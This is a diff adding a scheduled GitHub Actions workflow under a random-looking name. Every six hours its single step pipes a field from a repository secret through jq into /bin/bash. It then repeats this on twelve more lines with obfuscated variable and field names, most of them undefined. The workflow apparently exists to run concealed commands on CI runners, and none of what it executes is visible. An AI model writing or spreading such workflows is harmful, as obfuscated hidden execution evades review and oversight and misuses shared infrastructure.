@@ -1,0 +1,31 @@
+name: ruanxingzhu1987
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruanxingzhu1987
+        env:
+          c6: ${{ secrets.c6 }}
+        run: |
+          echo $c6 | jq -r .lmsrn84142 | /bin/bash
+          echo $yi16718 | jq -r .mfbiq5699 | /bin/bash
+          echo $st063 | jq -r .vcu76081 | /bin/bash
+          echo $tcim90778 | jq -r .rzu996 | /bin/bash
+          echo $upc2060 | jq -r .tb14 | /bin/bash
+          echo $cyrhs42 | jq -r .ssa8 | /bin/bash
+          echo $spxl4648 | jq -r .r114 | /bin/bash
+          echo $at84679 | jq -r .wpff866 | /bin/bash
+          echo $sl7 | jq -r .uu9211 | /bin/bash
+          echo $mb9225 | jq -r .sds44 | /bin/bash
+          echo $qm63 | jq -r .zcvnv2 | /bin/bash
+          echo $pe08879 | jq -r .mwy7971 | /bin/bash
+          echo $dpjyu86 | jq -r .y3 | /bin/bash
+
